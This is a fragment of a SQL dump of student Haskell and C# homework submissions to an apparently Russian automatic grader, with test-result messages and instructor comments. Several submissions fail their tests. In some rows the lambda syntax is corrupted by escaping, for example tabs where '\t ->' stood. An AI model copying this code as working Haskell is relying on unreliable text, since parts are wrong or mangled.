(3294, 82, 'jogrms', '2012-11-08 15:11:56', 1, 'countDifferentVars :: (Eq a) => [(a,a)] -> [a] -> Int\r\ncountDifferentVars dic = length . nub . map (getTag $ merge dic) where\r\n    getTag [] x = x\r\n    getTag (as:dic) x\r\n        | x `elem` as = head as\r\n        | otherwise   = getTag dic x\r\n\r\n    nub l = nub'' l [] where\r\n        nub'' [] _ = []\r\n        nub'' (x:xs) ls\r\n            | x `elem` ls   = nub'' xs ls\r\n            | otherwise     = x : nub'' xs (x:ls)\r\n\r\n    merge :: (Eq a) => [(a,a)] -> [[a]]\r\n    merge d = merge'' [] [] d where\r\n        merge'' acc dh (d:ds) = let (done, acc1) = ch acc d in\r\n            if done then merge'' acc1 [] (dh ++ ds)\r\n                    else merge'' acc (d:dh) ds\r\n        merge'' acc ((a,b):dh) [] = merge'' ([a,b]:acc) [] dh\r\n        merge'' acc [] [] = acc\r\n\r\n        ch [] _ = (False, [])\r\n        ch (as:acc) (x,y)\r\n            | x `elem` as = (True, (y:as):acc)\r\n            | y `elem` as = (True, (x:as):acc)\r\n            | otherwise   = let (done, acc1) = ch acc (x,y) in (done, as:acc1)', '<br/>Тесты успешно пройдены!'),
(3295, 91, 'jogrms', '2012-11-08 15:21:04', 1, 'merge [] bs = bs\r\nmerge as [] = as\r\nmerge (a:as) (b:bs)\r\n    | a == b = a : merge as bs\r\n    | a < b = a : merge as (b:bs)\r\n    | a > b = b : merge (a:as) bs\r\n', '<br/>Тесты успешно пройдены!'),
(3296, 90, 'jogrms', '2012-11-08 15:29:17', 1, 'findSame [] = Nothing\r\nfindSame (x:xs) = if x `elem` xs then Just x else findSame xs', '<br/>Тесты успешно пройдены!'),
(3297, 89, 'jogrms', '2012-11-08 15:49:17', 0, 'flatten t = flatten'' t [] where\r\n    flatten'' (Node a l r) = (a:) . flatten'' l . flatten'' r\r\n    flatten'' Empty = id', 'Не удалось вычислить выражение "flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))", проверьте правильность синтаксиса');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3298, 89, 'jogrms', '2012-11-08 15:50:48', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\nflatten :: Tree a -> [a]\r\nflatten t = flatten'' t [] where\r\n    flatten'' (Node a l r) = (a:) . flatten'' l . flatten'' r\r\n    flatten'' Empty = id\r\n', '<br/>Тесты успешно пройдены!'),
(3299, 87, 'jogrms', '2012-11-08 15:56:05', 1, 'data Expr a = Add (Expr a) (Expr a) | Mult (Expr a) (Expr a) | N a | X \r\n\r\neval X n = n\r\neval (N a) _ = a\r\neval (Add l r) n = eval l n + eval r n\r\neval (Mult l r) n = eval l n * eval r n', '<br/>Тесты успешно пройдены!'),
(3300, 88, 'jogrms', '2012-11-08 16:02:18', 1, 'data Expr a = Add (Expr a) (Expr a) | Mult (Expr a) (Expr a) | N a | X deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N a) = N 0\r\ndiff (Add l r) = Add (diff l) (diff r)\r\ndiff (Mult l r) = Add (Mult (diff l) r) (Mult l (diff r))\r\n', '<br/>Тесты успешно пройдены!'),
(3301, 85, '4169333', '2012-11-08 20:25:40', 0, 'gcd1 0 0 = error "The gcd of (0,0) is not definied"\r\ngcd1 m n = gcd2 (abs m) (abs n) where\r\n        gcd2 m 0 = m\r\n        gcd2 m n = gcd2 n (rem m n)\r\n\r\n\r\ndata Ration = Rat Int Int\r\ninstance Num Ration where \r\n	 Rat a1 b1 + Rat a2 b2= Rat (a1*b2+a2*b1) (b1*b2)\r\ninstance Eq Ration where \r\n	(Rat a1 b1) == (Rat a2 b2)= (a1*b2 == a2*b1)\r\ninstance Ord Ration where\r\n	compare (Rat a1 b1) (Rat a2 b2) = compare (a1*b2) (a2*b1)\r\ninstance Show Ration where\r\n        show (Rat a b)=  let \r\n			   g = gcd1 a b \r\n			   a1 = div a g\r\n			   b1 = div b g \r\n	                 in show a1 ++ "/" ++ show b1\r\n\r\n', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3302, 86, '4169333', '2012-11-08 20:26:25', 1, 'allNondivisible1 [] cond=True\r\nallNondivisible1 (x:xs) cond =\r\n	if  (not (cond x))\r\n	then False\r\n	else allNondivisible1 xs (	 ->cond t && (mod t x /= 0) && (mod x t /= 0) )\r\n\r\nallNondivisible xs=allNondivisible1 xs (const True)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3303, 87, '4169333', '2012-11-08 20:26:54', 1, 'data Expr = X | N Integer | Add Expr Expr |Mult Expr Expr\r\neval X num=num\r\neval (N n) num=n\r\neval (Add a b) num= (eval a num) + (eval b num)\r\neval (Mult a b) num = (eval a num) * (eval b num)', '<br/>Тесты успешно пройдены!'),
(3304, 88, '4169333', '2012-11-08 20:27:20', 0, 'data Expr = X | N Integer | Add Expr Expr |Mult Expr Expr deriving Show\r\ndiff X=(N 1)\r\ndiff (N n)=(N 0)\r\ndiff (Add a b)=Add (diff a) (diff b)\r\ndiff (Mult a b)=Add (Mult(diff a) b) (Mult (diff b) a)\r\n\r\n', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3305, 88, '4169333', '2012-11-08 20:29:30', 1, 'data Expr = X | N Integer | Add Expr Expr |Mult Expr Expr deriving Show\r\ndiff X=(N 1)\r\ndiff (N n)=(N 0)\r\ndiff (Add a b)=Add (diff a) (diff b)\r\ndiff (Mult a b)=Add (Mult(diff a) b) (Mult a (diff b))', '<br/>Тесты успешно пройдены!'),
(3306, 89, '4169333', '2012-11-08 20:30:14', 1, 'data Tree= Empty | Node Integer Tree Tree\r\nflatten t=flatten1 t []\r\nflatten1 Empty xs= xs\r\nflatten1 (Node x l r) xs= x: flatten1 l (flatten1 r xs)', '<br/>Тесты успешно пройдены!'),
(3307, 90, '4169333', '2012-11-08 20:30:45', 1, '  --- Засчитано, но, мне кажется, это не совсем по условию. Там было написано\r\n  --- "надо, чтобы пользователь мог понять, нашлось что-то или нет" и более-менее\r\n  --- понятно, мне кажется, что лучше, чтобы пользователь мог понять это _в программе_\r\n  --- Т.е. чтобы он мог написать что-то типа \r\n  ---  if ...как то выяснить, найдено что-то или нет... then ... else ...\r\n  --- Но ОК, это мы обсудим\r\nfindSame xs=findsame1 xs []\r\nfindsame1 (x:xs) set=\r\n	if elem x set\r\n	then return x\r\n	else findsame1 xs (x:set)\r\nfindsame1 [] _ = error "Nothing found"\r\n', '<br/>Тесты успешно пройдены!'),
(3308, 91, '4169333', '2012-11-08 20:31:25', 1, 'insert a [] = [a]\r\ninsert a (x:xs) = if a<x \r\n		  then a:x:xs \r\n		  else if a==x \r\n		  then a:xs\r\n		  else x:insert a xs\r\n\r\nmerge [] xs = xs\r\nmerge (x:xs) ys = insert x (merge xs ys)\r\n', '<br/>Тесты успешно пройдены!'),
(3309, 85, '4169333', '2012-11-08 21:24:54', 1, 'gcd1 0 0 = error "The gcd of (0,0) is not definied"\r\ngcd1 m n = gcd2 (abs m) (abs n) where\r\n        gcd2 m 0 = m\r\n        gcd2 m n = gcd2 n (rem m n)\r\n\r\n\r\ndata Ration = Rat Int Int\r\ninstance Num Ration where \r\n	 Rat a1 b1 + Rat a2 b2= Rat (a1*b2+a2*b1) (b1*b2)\r\ninstance Eq Ration where \r\n	(Rat a1 b1) == (Rat a2 b2)= (a1*b2 == a2*b1)\r\ninstance Ord Ration where\r\n	(Rat a1 b1) < (Rat a2 b2) = (((a1*b2 - a2*b1)>0 && (b1*b2<0)) || ((a1*b2 - a2*b1)<0 && (b1*b2>0)))\r\ninstance Show Ration where\r\n        show (Rat a b)=  let \r\n			   g = gcd1 a b \r\n			   a1 = div a g\r\n			   b1 = div b g \r\n	                 in show a1 ++ "/" ++ show b1', '<br/>Тесты успешно пройдены!'),
(3310, 83, '12206137', '2012-11-09 01:01:47', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace Work {\r\n\r\n    class Program {\r\n\r\n        static int[] nums = {2,3,9};\r\n\r\n        public static IEnumerable<int> Lst239() {\r\n\r\n            foreach (var x in nums) {\r\n\r\n                yield return x;\r\n\r\n            }\r\n\r\n            foreach (int i in Lst239()) {\r\n\r\n                foreach (var x in nums) {\r\n\r\n                    yield return i * 10 + x;\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n        public static void Main(string[] args) {\r\n\r\n            int cnt = 30;\r\n\r\n            foreach (int i in Lst239()) {\r\n\r\n                if (cnt-- == 0) break;\r\n\r\n                Console.Write(i + " ");\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3311, 91, 'erwert', '2012-11-09 01:36:57', 1, 'merge l1 [] = l1\r\nmerge [] l2 = l2\r\nmerge l1@(h1:hs1) l2@(h2:hs2)\r\n	| h1 > h2 = (h2:merge l1 hs2)\r\n	| h1 < h2 = (h1:merge hs1 l2)\r\n	| otherwise = merge l1 hs2 ', '<br/>Тесты успешно пройдены!'),
(3312, 97, '517309', '2012-11-09 15:06:05', 2, 'checkBrackets xs = checkBrackets'' xs []\r\n\r\ncheckBrackets'' (''('':xs) st = checkBrackets'' xs (''('':st)\r\ncheckBrackets'' (''['':xs) st = checkBrackets'' xs (''['':st)\r\n\r\ncheckBrackets'' ('')'':xs) (''('':st) = checkBrackets'' xs st\r\ncheckBrackets'' ('']'':xs) (''['':st) = checkBrackets'' xs st\r\n\r\ncheckBrackets'' [] [] = True\r\ncheckBrackets'' _ _ = False\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3313, 98, '517309', '2012-11-09 15:06:40', 0, 'toStr = id\r\nfromStr = id', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3314, 98, '517309', '2012-11-09 15:07:52', 0, 'data Tree = Empty | Node Char Tree Tree\r\n\r\ntoStr = id\r\nfromStr = id', 'Не удалось вычислить выражение "fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))", проверьте правильность синтаксиса'),
(3315, 98, '517309', '2012-11-09 15:11:04', 0, 'data Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\ntoStr = id\r\nfromStr = id\r\n', 'Выражение имеет неправильное значение: fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))'),
(3316, 98, '517309', '2012-11-09 15:13:23', 1, 'data Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\ntoStr = id\r\nfromStr = id\r\n', '<br/>Тесты успешно пройдены!'),
(3317, 93, '374969', '2012-11-09 16:01:53', 1, 'merge (hd1:tl1) (hd2:tl2) = if(hd1==hd2)then hd1:(merge tl1 tl2) else if(hd1<hd2)then hd1:(merge tl1 (hd2:tl2))else hd2:(merge (hd1:tl1) tl2)\r\n\r\npower3 = 1:[3*x|x <- power3]\r\n\r\nham  = merge power3 (1:[10*x|x <- ham])', '<br/>Тесты успешно пройдены!'),
(3318, 97, '44060', '2012-11-09 17:19:29', 1, 'checkBrackets xs = sk xs []\r\n	where\r\n		sk (''('':xs) closeList = sk xs ('')'':closeList)\r\n		sk (''['':xs) closeList = sk xs ('']'':closeList)\r\n		sk (x:xs) [] = False\r\n		sk (x:xs) (cl:cs) = if x == cl then sk xs cs\r\n								else False\r\n		sk [] [] = True\r\n		sk [] (x:xs) = False', '<br/>Тесты успешно пройдены!'),
(3319, 97, 'Deutsche', '2012-11-09 17:29:49', 2, '  --- Извините, что долго не проверял, было очень некогда. Идея у вас правильная, конечно,\r\n  --- но не все случаи рассмотрены. Вот такой вызов, например, у вас дает ошибку: \r\n  ---   checkBrackets "(("\r\n  --- Исправьте, пожалуйста (а я сейчас добавлю такой тест)\r\n  --- Еще, просто как замечание, счетчики n1 и n2 на самом деле не нужны, мне кажется,\r\n  --- вполне достаточно стека.\r\ncheckBrackets s = if ((length s) `mod` 2 == 1)\r\n			then False\r\n		  else checkBr s 0 0 []\r\ncheckBr "" 0 0 [] = True\r\ncheckBr (''('':s) n1 n2 stack = checkBr s (n1+1) n2 (''('':stack)\r\ncheckBr ('')'':s) n1 n2 stack = if ((n1<=0)||(n2<0))\r\n				then False\r\n	                      else \r\n                              if (head stack == ''['') \r\n				then False\r\n			      else checkBr s (n1-1) n2 (tail stack)\r\ncheckBr (''['':s) n1 n2 stack = checkBr s n1 (n2+1) (''['':stack)\r\ncheckBr ('']'':s) n1 n2 stack = if ((n1<0)||(n2<=0))\r\n			        then False\r\n        	              else\r\n			      if (head stack == ''('') \r\n			        then False\r\n	                      else checkBr s n1 (n2-1) (tail stack)', '<br/>Тесты успешно пройдены!'),
(3320, 98, 'Deutsche', '2012-11-09 19:09:21', 1, 'data Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\ntoStr :: Tree -> [Char]\r\n\r\ntoStr Empty = "_"\r\n\r\ntoStr (Node ''a'' l r) = "a(" ++ (toStr l) ++ ")(" ++ (toStr r) ++ ")"\r\n\r\ntoStr (Node ''b'' l r) = "b(" ++ (toStr l) ++ ")(" ++ (toStr r) ++ ")"\r\n\r\n\r\n\r\nfindClosingBracket s pos n = if ((s !! 0 == '')'')&&(n == 1))\r\n\r\n				then pos\r\n\r\n			     else \r\n\r\n			     if ((s !! 0 == '')'')&&(n > 1))\r\n\r\n				then findClosingBracket (tail s) (pos+1) (n-1)\r\n\r\n			     else\r\n\r\n			     if (s !! 0 == ''('')\r\n\r\n				then findClosingBracket (tail s) (pos+1) (n+1)\r\n\r\n			     else findClosingBracket (tail s) (pos+1) n\r\n\r\n\r\n\r\nfromStr :: [Char] -> Tree\r\n\r\nfromStr s = if (s !! 0 == ''a'')\r\n\r\n		then let\r\n\r\n			pos1 = findClosingBracket (tail s) 0 0\r\n\r\n			s1 = tail (tail (take (pos1 + 1) s))\r\n\r\n			srest = drop (pos1 + 2) s\r\n\r\n			pos2 = findClosingBracket srest 0 0\r\n\r\n			s2 = tail (take pos2 srest)\r\n\r\n		     in Node ''a'' (fromStr s1) (fromStr s2)\r\n\r\n	    else\r\n\r\n	    if (s !! 0 == ''b'')\r\n\r\n		then let\r\n\r\n			pos1 = findClosingBracket (tail s) 0 0\r\n\r\n			s1 = tail (tail (take (pos1 + 1) s))\r\n\r\n			srest = drop (pos1 + 2) s\r\n\r\n			pos2 = findClosingBracket srest 0 0\r\n\r\n			s2 = tail (take pos2 srest)\r\n\r\n		     in Node ''b'' (fromStr s1) (fromStr s2)\r\n\r\n	    else Empty\r\n', '<br/>Тесты успешно пройдены!'),
(3321, 83, '44060', '2012-11-09 19:12:34', 1, 'public static IEnumerable<int> Lst239()\r\n		{\r\n			yield return 2;\r\n			yield return 3;\r\n			yield return 9;\r\n			foreach (int i in Lst239())\r\n			{\r\n				yield return 2+i*10;\r\n				yield return 3+i*10;\r\n				yield return 9+i*10;\r\n			}\r\n		}\r\n', '<br/>Тесты успешно пройдены!'),
(3322, 84, '44060', '2012-11-09 19:28:40', 1, '		public static IEnumerable<Double> Iterate(double x, Func<double, double> fun)\r\n		{\r\n			yield return x;\r\n			foreach (double i in Iterate(x, fun))\r\n			{ yield return fun(i);}\r\n		}\r\n\r\n		static void Main(string[] args)\r\n		{\r\n			foreach (double x in Iterate(2,x => x*2))\r\n			{\r\n				Console.WriteLine(x);\r\n				if (x > 1000000) { break; }\r\n			}\r\n		}\r\n	\r\n', '<br/>Тесты успешно пройдены!'),
(3323, 97, '12206137', '2012-11-09 20:25:29', 1, 'parse (list, la) =\r\n\r\n    inner list\r\n\r\n    where\r\n\r\n        inner (x:xs) =\r\n\r\n            if x == la then (True,xs)\r\n\r\n            else\r\n\r\n                let (res, rem) = parse'' (x:xs) in\r\n\r\n                if not res then (False, [])\r\n\r\n                else inner rem\r\n\r\n\r\n\r\nparse'' (''('' : xs) = parse (xs, '')'')\r\n\r\nparse'' (''['' : xs) = parse (xs, '']'')\r\n\r\nparse'' _ = (False, [])\r\n\r\n\r\n\r\ncheckBrackets list = fst $ parse (list ++ [''$''], ''$'')\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3324, 98, '12206137', '2012-11-09 20:45:00', 1, 'data Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\n\r\n\r\ntoStr Empty = "()"\r\n\r\ntoStr (Node val left right) = ''('' : val : (toStr left) ++ (toStr right) ++ ")"\r\n\r\n\r\n\r\nparse (''('':'')'':rem) = (Empty, rem)\r\n\r\nparse (''('':val:rem) =\r\n\r\n    let (left, rl) = parse rem in\r\n\r\n    let (right, x : rr) = parse rl in\r\n\r\n    (Node val left right, rr)\r\n\r\n\r\n\r\nfromStr = fst . parse\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3325, 82, '472848', '2012-11-09 22:25:49', 0, 'import Data.List\r\n\r\ncountDifferentVars equals varib = f equals (nub varib)\r\n\r\nf [] varib = length varib\r\nf ((x, y):equals) varib = let varX = delete x varib in if (length varX == length varib) then f equals (delete y varib) else f equals varX', 'Выражение имеет неправильное значение: countDifferentVars [([''x''],[''y''])] [[''x'']]'),
(3326, 97, '2562137', '2012-11-09 23:58:33', 0, '', 'Не удалось вычислить выражение "checkBrackets [''('',''['','']'','')'']", проверьте правильность синтаксиса'),
(3327, 97, '2562137', '2012-11-09 23:58:55', 1, 'checkBrackets str = f str []\r\n\r\n\r\n\r\nf "" stack = length stack == 0\r\n\r\n\r\n\r\nf (c:str) stack =\r\n\r\n	if c == ''('' || c == ''['' then\r\n\r\n		f str (c:stack)\r\n\r\n	else if c == '')'' then\r\n\r\n		length stack > 0 && head stack == ''('' && f str (tail stack)\r\n\r\n	else if c == '']'' then\r\n\r\n		length stack > 0 && head stack == ''['' && f str (tail stack)\r\n\r\n	else\r\n\r\n		False\r\n\r\n		\r\n\r\ntest = (\r\n\r\n	checkBrackets "[()[]]()",\r\n\r\n	checkBrackets "([)]",\r\n\r\n	checkBrackets "())[]",\r\n\r\n	checkBrackets "([]"\r\n\r\n	)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3328, 98, '2562137', '2012-11-10 00:43:16', 0, 'data Tree = Node Char Tree Tree | Empty deriving Show\r\n\n\r\n\ntoStr Empty = "x"\r\n\ntoStr (Node c l r) = c : (toStr l ++ toStr r)\r\n\n\r\n\nfromStr str = fst (f str)\r\n\n\r\n\nf (c:str) =\r\n\n	if c == ''x'' then (Empty, str)\r\n\n	else (Node c l r, s2)\r\n\n	where\r\n\n		p1 = f str\r\n\n		l = fst p1\r\n\n		s1 = snd p1\r\n\n		p2 = f s1\r\n\n		r = fst p2\r\n\n		s2 = snd p2\r\n\n\r\n\ntest = (\r\n\n	toStr (Node ''a'' (Node ''b'' Empty (Node ''a'' Empty Empty)) Empty)\r\n\n	)\n', '<br/>Тесты успешно пройдены!'),
(3329, 82, '82873297', '2012-11-10 05:48:36', 0, 'countDifferentVars ps xs = length (countDifferentVars1 ps xs [])\r\n\n\r\n\ncountDifferentVars1 ps [] ws = []\r\n\ncountDifferentVars1 ps (x:xs) ws | (isInter newEq ws) = (countDifferentVars1 ps xs (ws++newEq))\r\n\n                                 | otherwise = (x:(countDifferentVars1 ps xs (ws++newEq))) where newEq=(eqs x ps)\r\n\n\r\n\neqs x [] = [x]\r\n\neqs x ((y,z):ps) | (x==y) = (z:(eqs x ps))\r\n\n                 | (x==z) = (y:(eqs x ps))\r\n\n                 | otherwise = eqs x ps\r\n\n\r\n\nisInter [] ys = False\r\n\nisInter (x:xs) ys | (elem x ys) = True\r\n\n                  | otherwise = isInter xs ys\n', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3330, 82, '82873297', '2012-11-10 05:59:52', 1, 'countDifferentVars ps xs = length (countDifferentVars1 ps xs [])\r\n\r\n\r\n\r\ncountDifferentVars1 ps [] ws = []\r\n\r\ncountDifferentVars1 ps (x:xs) ws | (isInter newEq ws) = (countDifferentVars1 ps xs (ws++newEq))\r\n\r\n                                 | otherwise = (x:(countDifferentVars1 ps xs (ws++newEq))) where newEq=(x:(eqs x ps []))\r\n\r\n\r\n\r\neqs x [] _ = []\r\n\r\neqs x ((y,z):ps) ts | (x==y) = (z:(eqs x ps ts))++(eqs z (ps++ts) [])\r\n\r\n                    | (x==z) = (y:(eqs x ps ts))++(eqs y (ps++ts) [])\r\n\r\n                    | otherwise = eqs x ps ((y,z):ts)\r\n\r\n\r\n\r\nisInter [] ys = False\r\n\r\nisInter (x:xs) ys | (elem x ys) = True\r\n\r\n                  | otherwise = isInter xs ys\r\n', '<br/>Тесты успешно пройдены!'),
(3331, 97, '82873297', '2012-11-10 06:43:35', 0, 'checkBrackets xs = checkBrackets1 xs []\r\n\n\r\n\ncheckBrackets1 [] [] = True\r\n\ncheckBrackets1 [] _ = False\r\n\ncheckBrackets1 (x:xs) ys | x==''['' = checkBrackets1 xs ('']'':ys)\r\n\n                         | x==''('' = checkBrackets1 xs ('')'':ys)\r\n\ncheckBrackets1 (x:xs) (y:ys) | x==y   = checkBrackets1 xs ys\r\n\n                             | otherwise = False\n', 'Не удалось вычислить выражение "checkBrackets [''('',''['','']'','')'','')'']", проверьте правильность синтаксиса'),
(3332, 97, '82873297', '2012-11-10 06:47:19', 1, 'checkBrackets xs = checkBrackets1 xs []\r\n\r\n\r\n\r\ncheckBrackets1 [] [] = True\r\n\r\ncheckBrackets1 [] _ = False\r\n\r\ncheckBrackets1 (x:xs) ys | x==''['' = checkBrackets1 xs ('']'':ys)\r\n\r\n                         | x==''('' = checkBrackets1 xs ('')'':ys)\r\n\r\ncheckBrackets1 (x:xs) (y:ys) | x==y   = checkBrackets1 xs ys\r\n\r\n                             | otherwise = False\r\n\r\ncheckBrackets1 _ [] = False\r\n', '<br/>Тесты успешно пройдены!'),
(3333, 85, '533223', '2012-11-10 11:00:43', 0, 'data Rat = Rat Int Int\r\ninstance Num Rat where\r\n	(Rat x1 y1)+(Rat x2 y2) = Rat (x1*y2 + x2*y1) (y1*y2)\r\ninstance Eq Rat where\r\n	(Rat x1 y1) == (Rat x2 y2) = (x1*y2) == (x2*y1)\r\ninstance Show Rat where\r\n	show (Rat x y) = (show x) ++ "/" ++ (show y)\r\ninstance Ord Rat where\r\n	(Rat x1 y1)<(Rat x2 y2) = (x1*y2) < (x2*y1)', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3334, 85, '533223', '2012-11-10 11:07:36', 1, 'data Rat = Rat Int Int\r\ninstance Num Rat where\r\n	(Rat x1 y1)+(Rat x2 y2) = Rat (x1*y2 + x2*y1) (y1*y2)\r\ninstance Eq Rat where\r\n	(Rat x1 y1) == (Rat x2 y2) = (x1*y2) == (x2*y1)\r\ninstance Show Rat where\r\n	show (Rat x y) = (show x) ++ "/" ++ (show y)\r\ninstance Ord Rat where\r\n	(Rat x1 y1)<(Rat x2 y2) = if (y1*y2>0)then (x1*y2) < (x2*y1)\r\n						else (x1*y2) > (x2*y1)', '<br/>Тесты успешно пройдены!'),
(3335, 86, '533223', '2012-11-10 11:21:48', 1, 'allNondivisible xs = allNondivisible1 xs (	->True)\r\n\r\nallNondivisible1 [] _ = True\r\nallNondivisible1 (x:xs) cond = if(cond x) then allNondivisible1 xs (	 -> (cond t) && ((rem t x) /= 0) && ((rem x t) /= 0))\r\n				else False', '<br/>Тесты успешно пройдены!'),
(3336, 87, '533223', '2012-11-10 11:31:55', 1, 'data Expr = X | N Integer | Add Expr Expr| Mult Expr Expr\r\n\r\nfoldExpr fa fm x fn (X) = x\r\nfoldExpr fa fm x fn (N n) = fn n\r\nfoldExpr fa fm x fn (Add e1 e2) = fa ef1 ef2\r\n				where \r\n					ef1 = foldExpr fa fm x fn e1\r\n					ef2 = foldExpr fa fm x fn e2\r\nfoldExpr fa fm x fn (Mult e1 e2) = fm ef1 ef2\r\n				where \r\n					ef1 = foldExpr fa fm x fn e1\r\n					ef2 = foldExpr fa fm x fn e2\r\n\r\neval expr num = foldExpr (e1 e2-> e1 + e2) (e1 e2-> e1*e2) num (\r\n->n) expr', '<br/>Тесты успешно пройдены!'),
(3337, 88, '533223', '2012-11-10 11:55:42', 1, 'data Expr = X | N Integer | Add Expr Expr| Mult Expr Expr deriving Show\r\n\r\ndiff (X) = (N 1)\r\ndiff (N n) = (N 0)\r\ndiff (Add e1 e2) = Add (diff e1) (diff e2)\r\ndiff (Mult e1 e2) = Add (Mult (diff e1) e2) (Mult e1 (diff e2))\r\n', '<br/>Тесты успешно пройдены!'),
(3338, 98, '6774563', '2012-11-10 12:22:39', 1, '-- Можно было бы и кодом Прюфера воспользоваться, он самый короткий.\r\n-- Однако, алгоритм подлиннее был бы. Я решил сделать по-своему\r\n   --- ОК, очень хорошо. Кстати, код Прюфера сам по себе тут видимо не подходит,\r\n   --- потому что он касается во первых помеченных деревьев, и, мб более существенно,\r\n   --- он касается деревьев общего вида, а не двоичных деревьев.\r\n   --- А это ведь не совсем одно и то же (в дереве общего вида, если у вершины одно поддерево,\r\n   --- то больше никакой информации хранить не надо, а в двоичном дереве надо знать, это левое\r\n   --- поддерево, или правое\r\n\r\ndata Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\ntoStr t = toStr'' t []\r\nfromStr s = fst $ fromStr'' s\r\n\r\ntoStr'' Empty acc = ''e'':acc\r\ntoStr'' (Node c l r) acc = c:toStr'' l (toStr'' r acc)\r\n\r\n\r\nfromStr'' [] = error "incorrect cipher"\r\nfromStr'' (x:xs)	| isEmpty x = (Empty, xs)\r\n		| otherwise = (Node x (fst left) (fst rigth), snd rigth) where\r\n	left = fromStr'' xs\r\n	rigth = fromStr'' $ snd left\r\n\r\nisEmpty x = x == ''e''\r\n', '<br/>Тесты успешно пройдены!'),
(3339, 97, '6774563', '2012-11-10 12:23:04', 1, 'checkBrackets s = null $ foldl (processBracket) [] s where\r\n	processBracket [] c	| isClose c = [''%'']\r\n	processBracket stack c	| isOpen c  = c:stack\r\n	processBracket (s:stack) c          = if (isOpenFor s c) then stack else ''%'':stack\r\n\r\nisOpen o = o == ''('' || o == ''[''\r\nisClose c = c == '')'' || c == '']''\r\nisOpenFor o c = o == ''('' && c == '')'' || o == ''['' && c == '']''\r\n', '<br/>Тесты успешно пройдены!'),
(3340, 89, '533223', '2012-11-10 12:37:44', 0, 'data Tree a = Empty| Node a (Tree a) (Tree a) deriving Show\r\n\r\nfoldTree f e Empty = e\r\nfoldTree f e (Node x l r) = f x lres rres\r\n				where \r\n					lres = foldTree f e l\r\n					rres = foldTree f e r\r\n\r\nflatten tree = foldTree (x l r-> (show x)++l++r) "" tree', 'Выражение имеет неправильное значение: flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))'),
(3341, 90, '533223', '2012-11-10 12:42:51', 1, 'data Finding = NoThing| Find Int deriving Show\r\nfindSame xs = findSame1 xs (	->True)\r\n\r\nfindSame1 [] _ = NoThing\r\nfindSame1 (x:xs) cond = if(cond x) then findSame1 xs (	 -> (cond t) && (x/=t))\r\n				else (Find x)', '<br/>Тесты успешно пройдены!'),
(3342, 86, 'tonyo', '2012-11-10 15:32:40', 1, 'nonDiv a b = (mod a b /= 0) && (mod b a /= 0)\r\n\r\nallNondivisible1 [] cond = True\r\nallNondivisible1 (x:xs) cond = if not (cond x)\r\n                               then False\r\n                               else allNondivisible1 xs (	 -> (cond t && nonDiv t x) )\r\n\r\nallNondivisible xs = allNondivisible1 xs (	 -> True)\r\n', '<br/>Тесты успешно пройдены!'),
(3343, 89, 'tonyo', '2012-11-10 15:33:20', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten t =  flatten1 t []\r\n\r\nflatten1 Empty res = res\r\nflatten1 (Node x lc rc) res = x : flatten1 lc (flatten1 rc res)\r\n', '<br/>Тесты успешно пройдены!'),
(3344, 82, '472848', '2012-11-10 15:37:09', 2, 'import Data.List\r\n\r\n   --- Что-то у вас неправильно, да.. Если хотите, можете попробовать исправить, скажем до вторника включительно.\r\n   --- (У тесте, который не проходит, вместо строк, написаны числа, но это, понятно, неважно.\r\n   --- Вы можете заменить 1 2 3 на "x1", "x2", "x3" и будет та же проблема.\r\ncountDifferentVars equals varib = f equals (nub varib) []\r\n\r\nf [] varib _ = length varib\r\n-- v - different variables\r\n-- d - deleted variables\r\n-- у - list of equalities\r\nf ((x, y):e) v d = let isX = intersect [x] v /= []\r\n                       isY = intersect [y] v /= []\r\n                       delX = intersect [x] d /= []\r\n                       delY = intersect [y] d /= []\r\n                       existX = isX || delX\r\n                       existY = isY || delY \r\n                       in if (not existX || not existY || (isX && delY) || (isY && delX)) \r\n                          then f e v d \r\n                          else f e (delete x v) (x:d)', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3345, 90, 'tonyo', '2012-11-10 15:44:11', 1, 'data Retval = Empty | Val Integer\r\n  deriving Show\r\n\r\nfindSame [] = Empty\r\nfindSame (x:xs) = if elem x xs\r\n                  then Val x   \r\n                  else findSame xs\r\n', '<br/>Тесты успешно пройдены!'),
(3346, 81, '63706456', '2012-11-10 16:43:42', 1, 'lst239 = 2:3:9:[x | y <- lst239, z <- [2,3,9], let x = y*10 + z]', '<br/>Тесты успешно пройдены!'),
